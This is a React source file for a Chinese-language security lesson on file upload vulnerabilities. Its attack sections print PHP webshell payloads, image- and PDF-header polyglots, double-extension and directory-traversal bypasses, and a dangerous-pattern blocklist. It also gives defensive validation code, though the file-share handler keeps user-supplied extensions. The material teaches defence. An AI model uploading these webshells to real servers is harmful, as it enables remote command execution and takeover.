'use client'

import LessonLayout, { type LessonMeta } from '@/app/components/ui/book/LessonLayout'
import { THEMES } from '@/app/components/ui/book/theme'
import {
  PageTitle, SectionTitle, BookParagraph, BookCode, BookAlert, BookList,
} from '@/app/components/ui/book/BookContent'

const META: LessonMeta = {
  subject: '网络安全',
  chapterTitle: '文件上传安全',
  chapterNumber: 6,
  totalChapters: 10,
  subjectHref: '/study/security/frontend',
  prevChapter: { label: 'SQL注入防护', href: '/study/security/frontend/sql' },
  nextChapter: { label: '敏感信息保护', href: '/study/security/frontend/sensitive' },
  theme: THEMES.security,
}

const sceneCode = `// 攻击场景示例
1. 上传WebShell
<?php eval($_POST['cmd']); ?>

2. 上传木马
<?php system($_GET['cmd']); ?>

3. 上传恶意图片
GIF89a<?php system($_GET['cmd']); ?>

4. 上传恶意文档
%PDF-1.4
<?php system($_GET['cmd']); ?>

5. 上传恶意视频
RIFF<?php system($_GET['cmd']); ?>`

const attackFlowCode = `// 攻击流程示例
1. 构造恶意文件
<?php
  $cmd = $_GET['cmd'];
  system($cmd);
?>

2. 修改文件类型 Content-Type: image/jpeg

3. 修改文件内容
GIF89a
<?php system($_GET['cmd']); ?>

4. 修改文件扩展名 shell.php.jpg

5. 访问WebShell
http://example.com/uploads/shell.php?cmd=id`

const bypassCodes = `// 1. 客户端验证绕过
// 修改文件扩展名 shell.php -> shell.jpg

// 2. 服务端验证绕过 - 修改Content-Type
Content-Type: image/jpeg

// 3. 文件类型绕过 - 添加文件头
GIF89a
<?php system($_GET['cmd']); ?>

// 4. 文件路径绕过 - 目录遍历
../../../shell.php

// 5. 文件权限绕过
chmod 777 shell.php`

const fileTypeValidation = `// 1. 验证文件扩展名
function validateFileExtension(filename) {
  const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif'];
  const ext = path.extname(filename).toLowerCase();
  return allowedExtensions.includes(ext);
}

// 2. 验证文件类型
function validateFileType(file) {
  const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
  return allowedTypes.includes(file.mimetype);
}

// 3. 验证文件内容（魔法字节）
function validateFileContent(file) {
  const fileHeader = file.buffer.slice(0, 8);
  const jpegHeader = Buffer.from([0xFF, 0xD8, 0xFF]);
  const pngHeader = Buffer.from([0x89, 0x50, 0x4E, 0x47]);
  const gifHeader = Buffer.from([0x47, 0x49, 0x46, 0x38]);
  return fileHeader.includes(jpegHeader) ||
         fileHeader.includes(pngHeader) ||
         fileHeader.includes(gifHeader);
}`

const fileContentValidate = `// 1. 验证文件大小
function validateFileSize(file) {
  const maxSize = 5 * 1024 * 1024; // 5MB
  return file.size <= maxSize;
}

// 2. 验证文件内容（危险模式检查）
function validateFileContent(file) {
  const content = file.buffer.toString();
  const dangerousPatterns = [
    '<?php', '<?=', '<script',
    'eval(', 'system(', 'exec(', 'shell_exec('
  ];
  return !dangerousPatterns.some(pattern => content.includes(pattern));
}

// 3. 验证图片格式
function validateFileFormat(file) {
  return new Promise((resolve, reject) => {
    const image = new Image();
    image.onload = () => resolve(true);
    image.onerror = () => reject(new Error('Invalid image format'));
    image.src = URL.createObjectURL(file);
  });
}`

const storageSecurity = `// 1. 生成随机文件名
function generateRandomFilename(originalFilename) {
  const ext = path.extname(originalFilename);
  const randomName = crypto.randomBytes(16).toString('hex');
  return randomName + ext;
}

// 2. 设置安全的存储路径
function getSecureStoragePath(filename) {
  const date = new Date();
  const year = date.getFullYear();
  const month = String(date.getMonth() + 1).padStart(2, '0');
  const day = String(date.getDate()).padStart(2, '0');
  return path.join('uploads', year.toString(), month, day, filename);
}

// 3. 设置文件权限
function setSecureFilePermissions(filepath) {
  fs.chmodSync(filepath, 0o644);
}`

const avatarCaseCode = `// 后端实现
import express from 'express';
import multer from 'multer';
import path from 'path';
import crypto from 'crypto';
import sharp from 'sharp';

const app = express();
const storage = multer.memoryStorage();
const upload = multer({
  storage,
  limits: { fileSize: 5 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
    if (!allowedTypes.includes(file.mimetype)) {
      cb(new Error('不支持的文件类型')); return;
    }
    cb(null, true);
  }
});

app.post('/api/avatar', upload.single('avatar'), async (req, res) => {
  try {
    if (!req.file) return res.status(400).json({ error: '请选择文件' });

    const ext = path.extname(req.file.originalname);
    const filename = crypto.randomBytes(16).toString('hex') + ext;

    const image = sharp(req.file.buffer);
    const metadata = await image.metadata();
    if (metadata.width > 2000 || metadata.height > 2000) {
      return res.status(400).json({ error: '图片尺寸超过限制' });
    }

    await image.resize(200, 200, { fit: 'cover', position: 'center' })
      .jpeg({ quality: 80 })
      .toFile(path.join('uploads', 'avatars', filename));

    res.json({ filename });
  } catch (error) {
    res.status(500).json({ error: '上传失败' });
  }
});`

const fileShareCaseCode = `// 后端实现
import express from 'express';
import multer from 'multer';
import path from 'path';
import crypto from 'crypto';
import fs from 'fs';

const app = express();

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = path.join('uploads', 'files');
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname);
    const filename = crypto.randomBytes(16).toString('hex') + ext;
    cb(null, filename);
  }
});

const upload = multer({
  storage,
  limits: { fileSize: 50 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    const allowedTypes = [
      'application/pdf',
      'application/msword',
      'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
      'application/vnd.ms-excel',
      'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
    ];
    if (!allowedTypes.includes(file.mimetype)) {
      cb(new Error('不支持的文件类型')); return;
    }
    cb(null, true);
  }
});

app.post('/api/files', upload.single('file'), async (req, res) => {
  try {
    if (!req.file) return res.status(400).json({ error: '请选择文件' });

    const shareId = crypto.randomBytes(8).toString('hex');
    const shareLink = \`/share/\${shareId}\`;

    await db.collection('shares').insertOne({
      id: shareId, filename: req.file.filename,
      originalname: req.file.originalname,
      mimetype: req.file.mimetype, size: req.file.size,
      path: req.file.path, createdAt: new Date(),
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
    });

    res.json({ shareLink });
  } catch (error) {
    res.status(500).json({ error: '上传失败' });
  }
});`

const SPREADS = [
  {
    label: '攻击概述',
    left: (
      <div className="space-y-4">
        <PageTitle>文件上传安全概述</PageTitle>
        <SectionTitle>1. 文件上传漏洞定义</SectionTitle>
        <BookParagraph>
          文件上传漏洞是指网站对用户上传的文件没有进行严格的验证和过滤，导致攻击者可以上传恶意文件（如WebShell、木马等），从而获取服务器控制权或执行恶意代码。
        </BookParagraph>
        <SectionTitle>2. 攻击特点</SectionTitle>
        <BookList items={['绕过文件类型验证', '绕过文件内容验证', '绕过文件大小限制', '绕过文件路径验证', '绕过文件权限验证']} />
      </div>
    ),
    right: (
      <div className="space-y-4">
        <SectionTitle>3. 常见攻击场景</SectionTitle>
        <BookList items={['头像上传', '文件分享', '图片上传', '文档上传', '视频上传']} />
        <BookCode language="php" code={sceneCode} />
      </div>
    ),
  },
  {
    label: '攻击原理',
    left: (
      <div className="space-y-4">
        <PageTitle>攻击原理</PageTitle>
        <SectionTitle>1. 基本攻击流程</SectionTitle>
        <BookList items={['识别上传点', '构造恶意文件', '绕过验证', '上传文件', '访问文件']} />
        <BookCode language="php" code={attackFlowCode} />
      </div>
    ),
    right: (
      <div className="space-y-4">
        <SectionTitle>2. 攻击类型与技巧</SectionTitle>
        <BookCode language="php" code={bypassCodes} />
      </div>
    ),
  },
  {
    label: '防御方案',
    left: (
      <div className="space-y-4">
        <PageTitle>防御方案</PageTitle>
        <SectionTitle>1. 文件类型验证</SectionTitle>
        <BookCode language="javascript" code={fileTypeValidation} />
        <SectionTitle>2. 文件内容验证</SectionTitle>
        <BookCode language="javascript" code={fileContentValidate} />
      </div>
    ),
    right: (
      <div className="space-y-4">
        <SectionTitle>3. 文件存储安全</SectionTitle>
        <BookCode language="javascript" code={storageSecurity} />
        <SectionTitle>4. 其他防御措施</SectionTitle>
        <BookList items={['使用CDN分发', '使用云存储（S3等）', '使用文件扫描（杀毒、恶意代码检测）']} />
      </div>
    ),
  },
  {
    label: '实战案例',
    left: (
      <div className="space-y-4">
        <PageTitle>头像上传防护</PageTitle>
        <BookCode language="javascript" code={avatarCaseCode} />
      </div>
    ),
    right: (
      <div className="space-y-4">
        <PageTitle>文件分享防护</PageTitle>
        <BookCode language="javascript" code={fileShareCaseCode} />
      </div>
    ),
  },
]

export default function FileUploadSecurityPage() {
  return <LessonLayout meta={META} spreads={SPREADS} />
}
